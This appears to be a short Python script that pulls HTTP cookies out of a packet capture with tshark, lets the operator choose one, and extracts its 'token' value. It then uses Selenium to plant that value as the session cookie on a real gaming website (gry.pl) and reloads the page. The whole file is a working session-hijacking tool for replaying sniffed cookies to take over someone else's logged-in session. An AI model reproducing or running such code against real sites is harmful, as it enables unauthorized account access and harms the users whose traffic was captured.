import selenium.webdriver
import subprocess
import sys

# if sys.argv.__le__ < 1:
#     print("need more")

source = sys.argv[1]
print("sourcefile: " + source)
cmd = ['tshark', '-r', source,  '-Y', 'http.cookie', '-T', 'fields', '-e', 'http.cookie']
result = subprocess.run(cmd, stdout=subprocess.PIPE)

result = result.stdout.decode("utf-8")
dataString = result.split('\n')


cookie = None
number = None
token_value = None

while True:
    print("\nData contains ",len(dataString)," occurences of cookies.\n")

    try:
        number=int(input("Chose a number in array (from 0)\n"))
    except ValueError:
        print("Not a number")
    
    cookie = dataString[number]
    print("Chosen cookie:\n",cookie)
    
    cookie = cookie.replace("; ",'=').split('=')
    b = False

    for i in range(len(cookie)):
        if(cookie[i] == 'token'):
            b = True
            break

    if b == False:
        print("Error token does not exist in this data set; choose another number\n")
        continue
    else:
        token_value = cookie[i + 1]
        break



driver = selenium.webdriver.Firefox()
driver.get("http://gry.pl")
all_cookies = driver.get_cookies()
token = driver.get_cookie('token')
token['value'] = token_value

driver.delete_cookie('token')
driver.add_cookie(token)
driver.refresh()

